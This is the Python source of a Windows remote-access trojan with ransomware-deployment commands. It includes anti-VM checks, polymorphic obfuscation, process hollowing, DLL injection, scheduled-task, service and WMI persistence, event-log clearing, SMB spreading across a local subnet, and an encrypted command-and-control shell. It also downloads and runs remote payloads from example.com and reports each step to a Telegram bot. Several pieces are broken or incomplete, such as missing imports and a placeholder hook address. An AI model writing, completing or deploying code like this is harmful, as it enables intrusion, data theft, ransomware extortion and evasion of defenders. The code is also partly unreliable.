import subprocess
import socket
import base64
import time
import os
import sys
import pythoncom
import win32api
import win32con
import win32serviceutil
import win32service
import win32event
import servicemanager
import win32process
import ctypes
import psutil
import winreg
import random
import string
import hashlib
from urllib.request import urlopen
import shutil
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import requests
import json

# Constants
BLOCK_SIZE = 32
secret = b"enter your secret key"
HOSTS = ['', '']  # C2 fallback servers
PORT = 9999
iv = b'0000000000000000'
cipher = AES.new(secret, AES.MODE_CFB, iv)
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# Telegram notification
def send_telegram_message(message):
    try:
        bot_token = DecodeAES(cipher, bytes.fromhex("bot token")).decode()
        chat_id = DecodeAES(cipher, bytes.fromhex("chat id")).decode()
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={urllib.parse.quote(message)}"
        requests.get(url, timeout=5)
        return "Telegram sent"
    except:
        return "Telegram failed"

# Polymorphic obfuscation
def obfuscate_code(code):
    try:
        key = get_random_bytes(16)
        xored = ''.join(chr(ord(c) ^ key[i % len(key)]) for i, c in enumerate(code))
        junk = "\n".join([f"def junk_{i}(): return {random.randint(1, 1000)}" for i in range(5)])
        obf_code = f"""
{junk}
def decode(s, k):
    return ''.join(chr(ord(c) ^ k[i % len(k)]) for i, c in enumerate(s))
key = {repr(base64.b64encode(key).decode())}
code = {repr(base64.b64encode(xored.encode()).decode())}
exec(decode(base64.b64decode(code).decode(), base64.b64decode(key)))
"""
        send_telegram_message("Code obfuscated polymorphically")
        return obf_code
    except:
        send_telegram_message("Obfuscation failed")
        return code

# Anti-analysis
def anti_analysis():
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS") as key:
            bios = winreg.QueryValueEx(key, "SystemProductName")[0].lower()
            if any(x in bios for x in ["vmware", "virtualbox", "qemu"]):
                return True
        vm_keys = [
            r"SOFTWARE\VMware, Inc.\VMware Tools",
            r"SOFTWARE\Oracle\VirtualBox Guest Additions"
        ]
        for key in vm_keys:
            try:
                winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key)
                return True
            except:
                pass
        disk = psutil.disk_usage('/')
        if disk.total < 60 * 1024 * 1024 * 1024:
            return True
        if time.time() - psutil.boot_time() < 300:
            return True
        p1 = win32api.GetCursorPos()
        time.sleep(1)
        p2 = win32api.GetCursorPos()
        if p1 == p2:
            return True
        return False
    except:
        return False

# Hook NtTerminateProcess
def hook_terminate():
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        ntdll = ctypes.WinDLL('ntdll')
        class HookStruct(ctypes.Structure):
            _fields_ = [("jmp", ctypes.c_ubyte * 5)]
        orig_addr = kernel32.GetProcAddress(ntdll._handle, b'NtTerminateProcess')
        hook_code = HookStruct()
        hook_code.jmp[0] = 0xE9
        ctypes.memmove(ctypes.byref(hook_code.jmp) + 1, ctypes.byref(ctypes.c_uint32(0xDEADBEEF)), 4)  # Placeholder
        old_protect = ctypes.c_uint32()
        kernel32.VirtualProtect(ctypes.c_void_p(orig_addr), ctypes.sizeof(hook_code), 0x40, ctypes.byref(old_protect))
        kernel32.WriteProcessMemory(ctypes.c_int(-1), ctypes.c_void_p(orig_addr), ctypes.byref(hook_code), ctypes.sizeof(hook_code), None)
        kernel32.VirtualProtect(ctypes.c_void_p(orig_addr), ctypes.sizeof(hook_code), old_protect, ctypes.byref(old_protect))
        send_telegram_message("Hooked NtTerminateProcess")
    except:
        send_telegram_message("Failed to hook NtTerminateProcess")

# Process hollowing
def process_hollowing():
    kernel32 = ctypes.WinDLL('kernel32')
    exe = sys.executable
    class STARTUPINFO(ctypes.Structure):
        _fields_ = [
            ("cb", ctypes.wintypes.DWORD),
            ("lpReserved", ctypes.wintypes.LPWSTR),
            ("lpDesktop", ctypes.wintypes.LPWSTR),
            ("lpTitle", ctypes.wintypes.LPWSTR),
            ("dwX", ctypes.wintypes.DWORD),
            ("dwY", ctypes.wintypes.DWORD),
            ("dwXSize", ctypes.wintypes.DWORD),
            ("dwYSize", ctypes.wintypes.DWORD),
            ("dwXCountChars", ctypes.wintypes.DWORD),
            ("dwYCountChars", ctypes.wintypes.DWORD),
            ("dwFillAttribute", ctypes.wintypes.DWORD),
            ("dwFlags", ctypes.wintypes.DWORD),
            ("wShowWindow", ctypes.wintypes.WORD),
            ("cbReserved2", ctypes.wintypes.WORD),
            ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
            ("hStdInput", ctypes.wintypes.HANDLE),
            ("hStdOutput", ctypes.wintypes.HANDLE),
            ("hStdError", ctypes.wintypes.HANDLE),
        ]

    class PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [
            ("hProcess", ctypes.wintypes.HANDLE),
            ("hThread", ctypes.wintypes.HANDLE),
            ("dwProcessId", ctypes.wintypes.DWORD),
            ("dwThreadId", ctypes.wintypes.DWORD),
        ]

    si = STARTUPINFO()
    si.cb = ctypes.sizeof(si)
    pi = PROCESS_INFORMATION()
    creation_flags = 0x4
    success = kernel32.CreateProcessW(
        ctypes.c_wchar_p("C:\\Windows\\svchost.exe"),
        None, None, None, False, creation_flags, None, None, ctypes.byref(si), ctypes.byref(pi)
    )
    if not success:
        send_telegram_message("Process hollowing failed")
        return
    try:
        with open(exe, "rb") as f:
            data = f.read()
        remote_addr = kernel32.VirtualAllocEx(pi.hProcess, None, len(data), 0x1000 | 0x2000, 0x40)
        written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(pi.hProcess, remote_addr, data, len(data), ctypes.byref(written))
        dh = struct.unpack_from("<H", data, 0)[0]
        nh = struct.unpack_from("<I", data, dh + 0x3C)[0]
        entry_point = remote_addr + struct.unpack_from("<I", data, nh + 0x28)[0]
        class CONTEXT(ctypes.Structure):
            _fields_ = [
                ("ContextFlags", ctypes.wintypes.DWORD),
                ("Dr0", ctypes.wintypes.DWORD),
                ("Dr1", ctypes.wintypes.DWORD),
                ("Dr2", ctypes.wintypes.DWORD),
                ("Dr3", ctypes.wintypes.DWORD),
                ("Dr6", ctypes.wintypes.DWORD),
                ("Dr7", ctypes.wintypes.DWORD),
                ("FloatSave", ctypes.c_byte * 512),
                ("SegGs", ctypes.wintypes.DWORD),
                ("SegFs", ctypes.wintypes.DWORD),
                ("SegEs", ctypes.wintypes.DWORD),
                ("SegDs", ctypes.wintypes.DWORD),
                ("Edi", ctypes.wintypes.DWORD),
                ("Esi", ctypes.wintypes.DWORD),
                ("Ebx", ctypes.wintypes.DWORD),
                ("Edx", ctypes.wintypes.DWORD),
                ("Ecx", ctypes.wintypes.DWORD),
                ("Eax", ctypes.wintypes.DWORD),
                ("Ebp", ctypes.wintypes.DWORD),
                ("Eip", ctypes.wintypes.DWORD),
                ("SegCs", ctypes.wintypes.DWORD),
                ("EFlags", ctypes.wintypes.DWORD),
                ("Esp", ctypes.wintypes.DWORD),
                ("SegSs", ctypes.wintypes.DWORD),
            ]
        context = CONTEXT()
        context.ContextFlags = 0x10007
        kernel32.GetThreadContext(pi.hThread, ctypes.byref(context))
        context.Eip = entry_point
        kernel32.SetThreadContext(pi.hThread, ctypes.byref(context))
        kernel32.ResumeThread(pi.hThread)
        send_telegram_message("Process hollowing completed")
    except:
        kernel32.TerminateProcess(pi.hProcess, 0)
        send_telegram_message("Process hollowing failed")
    finally:
        kernel32.CloseHandle(pi.hThread)
        kernel32.CloseHandle(pi.hProcess)

# DLL injection (placeholder, requires DLL file)
def dll_injection():
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        dll_path = os.path.join(os.getenv("TEMP"), f"dll_{rn()}.dll")
        with open(dll_path, "wb") as f:
            f.write(b"")  # Placeholder DLL content
        process_id = [proc.pid for proc in psutil.process_iter(['name']) if proc.info['name'] == 'svchost.exe'][0]
        h_process = kernel32.OpenProcess(0x1F0FFF, False, process_id)
        remote_addr = kernel32.VirtualAllocEx(h_process, None, len(dll_path), 0x1000 | 0x2000, 0x40)
        kernel32.WriteProcessMemory(h_process, remote_addr, dll_path.encode(), len(dll_path), None)
        kernel32.LoadLibraryW.argtypes = [ctypes.c_wchar_p]
        h_thread = kernel32.CreateRemoteThread(h_process, None, 0, kernel32.GetProcAddress(kernel32._handle, b"LoadLibraryW"), remote_addr, 0, None)
        kernel32.WaitForSingleObject(h_thread, 0xFFFFFFFF)
        kernel32.CloseHandle(h_thread)
        kernel32.CloseHandle(h_process)
        send_telegram_message("DLL injection completed")
    except:
        send_telegram_message("DLL injection failed")

# Random name generator
def rn(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

# Hide file/process
def hide_file(path):
    try:
        win32api.SetFileAttributes(path, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
        send_telegram_message(f"Hid file: {path}")
    except:
        send_telegram_message(f"Failed to hide file: {path}")

# Scheduled task persistence
def create_scheduled_task():
    tn = f"s_task_{rn()}"
    cmd = f'schtasks /create /tn "{tn}" /tr "\"{sys.executable}\" --service" /sc minute /mo 5 /rl HIGHEST /f'
    try:
        subprocess.run(cmd, shell=True, capture_output=True, check=True)
        send_telegram_message(f"Created scheduled task: {tn}")
    except:
        send_telegram_message("Failed to create scheduled task")

# Service persistence
def install_service():
    class S(win32serviceutil.ServiceFramework):
        _svc_name_ = f"s_svc_{rn()}"
        _svc_display_name_ = "System Maintenance"
        _svc_description_ = "System maintenance service"
        def __init__(self, args):
            win32serviceutil.ServiceFramework.__init__(self, args)
            self.h = win32event.CreateEvent(None, 0, 0, None)
        def SvcStop(self):
            self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
            win32event.SetEvent(self.h)
        def SvcDoRun(self):
            servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE, servicemanager.PYS_SERVICE_STARTED, (self._svc_name_, ''))
            try:
                subprocess.run(f'start "" "{sys.executable}"', shell=True)
                send_telegram_message("Service started")
            except:
                send_telegram_message("Service failed to start")
    if __name__ == '__main__':
        win32serviceutil.HandleCommandLine(S)

# WMI persistence
def wmi_persistence():
    pythoncom.CoInitialize()
    try:
        wmi_c = wmi.WMI()
        wmi_c.Win32_Process.watch_for("deletion")
        while True:
            try:
                if not any(proc.name().lower() == 'shell.exe' for proc in psutil.process_iter(['name'])):
                    subprocess.run(f'start "" "{sys.executable}"', shell=True)
                    send_telegram_message("Restarted shell.exe via WMI")
                time.sleep(1)
            except:
                pass
    except:
        send_telegram_message("WMI persistence failed")
    finally:
        pythoncom.CoUninitialize()

# Clear logs
def clear_logs():
    try:
        for log in ["Security", "System", "Application", "Setup", "Microsoft-Windows-Windows Defender/Operational"]:
            subprocess.run(f"wevtutil cl {log}", shell=True, capture_output=True)
        send_telegram_message("Cleared event logs")
    except:
        send_telegram_message("Failed to clear event logs")

# DNS tunneling (simulated via HTTPS POST)
def dns_tunnel(data):
    try:
        encoded = base64.b64encode(data.encode()).decode()
        payload = {"query": f"{encoded}.example.com"}
        for host in HOSTS:
            try:
                response = requests.post(f"https://{host}/dns", json=payload, timeout=5)
                if response.status_code == 200:
                    return base64.b64decode(response.json().get("response", "")).decode()
                send_telegram_message(f"DNS tunnel success via {host}")
            except:
                continue
        send_telegram_message("DNS tunnel failed")
        return ""
    except:
        send_telegram_message("DNS tunnel error")
        return ""

# HTTPS C2 communication
def connect_to_server():
    global active
    while True:
        for host in HOSTS:
            try:
                response = requests.post(f"https://{host}:{PORT}/cmd", json={"vid": vid}, timeout=5)
                if response.status_code == 200:
                    data = DecodeAES(cipher, base64.b64decode(response.json().get("cmd", "")))
                    if data == 'spread':
                        stdoutput = spread_smb()
                        requests.post(f"https://{host}:{PORT}/result", json={"vid": vid, "result": EncodeAES(cipher, stdoutput).decode()})
                    elif data == 'deploy':
                        for file in ["http://example.com/shell.py", "http://example.com/ransomware.exe", "http://example.com/screenlock.py"]:
                            stdoutput = downloadBackdoor(file)
                        requests.post(f"https://{host}:{PORT}/result", json={"vid": vid, "result": EncodeAES(cipher, stdoutput).decode()})
                    elif data == 'unlock':
                        key = DecodeAES(cipher, base64.b64decode(response.json().get("key", "")))
                        iv = DecodeAES(cipher, base64.b64decode(response.json().get("iv", "")))
                        stdoutput = f"Unlock key: {key}, IV: {iv}"
                        requests.post(f"https://{host}:{PORT}/result", json={"vid": vid, "result": EncodeAES(cipher, stdoutput).decode()})
                    elif data == 'quit' or data == 'terminate':
                        requests.post(f"https://{host}:{PORT}/result", json={"vid": vid, "result": EncodeAES(cipher, "quitted").decode()})
                        active = False
                        break
                    send_telegram_message(f"C2 command executed: {data}")
                return
            except:
                send_telegram_message(f"C2 connection failed: {host}")
                time.sleep(10)
                continue
        if not active:
            break

# Spread via SMB
def spread_smb():
    try:
        ip_range = "192.168.1.0/24"
        for i in range(1, 255):
            ip = f"192.168.1.{i}"
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((ip, 445))
                for file in ["shell.py", "ransomware.exe", "screenlock.py"]:
                    shutil.copy(file, f"\\\\{ip}\\C$\\{file}")
                sock.close()
                send_telegram_message(f"Spread to {ip}")
            except:
                continue
        send_telegram_message("SMB spread completed")
        return "Spread done."
    except:
        send_telegram_message("SMB spread failed")
        return "Spread failed."

# Download backdoor
def downloadBackdoor(url):
    try:
        filename = url.split('/')[-1].split('#')[0].split('?')[0]
        with urlopen(url) as u:
            with open(filename, "wb") as outfile:
                outfile.write(u.read())
        subprocess.Popen(filename, shell=True)
        send_telegram_message(f"Downloaded and executed {filename}")
        return f"Downloaded and executed {filename}"
    except Exception as e:
        send_telegram_message(f"Download error: {str(e)}")
        return f"Download error: {str(e)}"

# Download from URL
def downhttp(sock, url):
    filename = url.split('/')[-1].split('#')[0].split('?')[0]
    try:
        with urlopen(url) as u:
            with open(filename, 'wb') as g:
                g.write(u.read())
        send_telegram_message(f"Downloaded {filename}")
        return "Finished download."
    except:
        send_telegram_message(f"Download failed: {url}")
        return "Download failed."

# Upload file
def upload(sock, filename):
    try:
        with open(filename, 'rb') as f:
            fileData = f.read()
            sock.sendall(EncodeAES(cipher, fileData))
        send_telegram_message(f"Uploaded {filename}")
        return "Finished download."
    except:
        send_telegram_message(f"Upload failed: {filename}")
        return "Upload failed."

# Download file
def download(sock, filename):
    try:
        fileData = Receive(sock)
        with open(filename, 'wb') as g:
            g.write(fileData)
        send_telegram_message(f"Downloaded {filename}")
        return "Finished upload."
    except:
        send_telegram_message(f"Download failed: {filename}")
        return "Download failed."

# Persistence
def persist():
    try:
        exe = sys.executable
        new_name = f"s_{rn()}.exe"
        new_path = os.path.join(os.getenv("TEMP"), new_name)
        shutil.copy(exe, new_path)
        hide_file(new_path)
        create_scheduled_task()
        install_service()
        threading.Thread(target=wmi_persistence, daemon=True).start()
        send_telegram_message("Persistence established")
        return "Persistence complete."
    except:
        send_telegram_message("Persistence failed")
        return "Persistence failed."

# Execute command
def exec_cmd(cmd):
    try:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        send_telegram_message(f"Executed command: {cmd}")
        return output.decode()
    except:
        send_telegram_message(f"Command execution failed: {cmd}")
        return "Command execution failed."

# Send data
def send(sock, cmd, end="EOFEOFEOFEOFEOFX"):
    sock.sendall(EncodeAES(cipher, cmd + end))

# Receive data
def receive(sock, end="EOFEOFEOFEOFEOFX"):
    data = ""
    while True:
        l = sock.recv(1024)
        decrypted = DecodeAES(cipher, l)
        data += decrypted
        if data.endswith(end):
            break
    return data[:-len(end)]

# Prompt
def prompt(sock, promptmsg):
    send(sock, promptmsg)
    return receive(sock)

# Main loop
vid = hashlib.sha256((os.getenv("COMPUTERNAME", "Unknown") + str(time.time())).encode()).hexdigest()[:16]
active = True

if anti_analysis():
    send_telegram_message("VM or analysis environment detected, exiting")
    os._exit(0)

hide_file(sys.executable)
persist()
process_hollowing()
dll_injection()
hook_terminate()
clear_logs()

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOSTS[0], PORT))
        cipher = AES.new(secret, AES.MODE_CFB, iv)
        data = receive(s)
        
        if data == 'Activate':
            active = True
            send(s, "\n" + os.getcwd() + ">")
        
        while active:
            data = receive(s)
            if data == '':
                time.sleep(0.02)
            elif data == "quit" or data == "terminate":
                send(s, "quitted")
                active = False
                break
            elif data == "activate_ransomware":
                try:
                    subprocess.Popen("ransomware.exe", shell=True)
                    stdoutput = "Ransomware activated."
                except:
                    stdoutput = "Error activating ransomware."
            elif data == "activate_screenlock":
                try:
                    subprocess.Popen("screenlock.exe", shell=True)
                    stdoutput = "Screenlock activated."
                except:
                    stdoutput = "Error activating screenlock."
            elif data == "spread":
                stdoutput = spread_smb()
            elif data == "deploy":
                try:
                    for file in ["http://example.com/shell.py", "http://example.com/ransomware.exe", "http://example.com/screenlock.py"]:
                        stdoutput = downloadBackdoor(file)
                    stdoutput = "Deployed all files."
                except:
                    stdoutput = "Error deploying files."
            elif data == "unlock":
                try:
                    key = receive(s)
                    iv = receive(s)
                    stdoutput = f"Unlock key: {key}, IV: {iv}"
                except:
                    stdoutput = "Error receiving unlock key."
            elif data.startswith("cd "):
                try:
                    os.chdir(data[3:])
                    stdoutput = ""
                except:
                    stdoutput = "Error opening directory.\n"
            elif data.startswith("download"):
                stdoutput = upload(s, data[9:])
            elif data.startswith("downhttp"):
                stdoutput = downhttp(s, data[9:])
            elif data.startswith("upload"):
                stdoutput = download(s, data[7:])
            elif data.startswith("persist"):
                stdoutput = persist()
            else:
                stdoutput = exec_cmd(data)
            
            stdoutput = stdoutput + "\n" + os.getcwd() + ">"
            send(s, stdoutput)
        
        if data == "terminate":
            break
        time.sleep(3)
    except socket.error:
        s.close()
        threading.Thread(target=connect_to_server, daemon=True).start()
        time.sleep(10)
        continue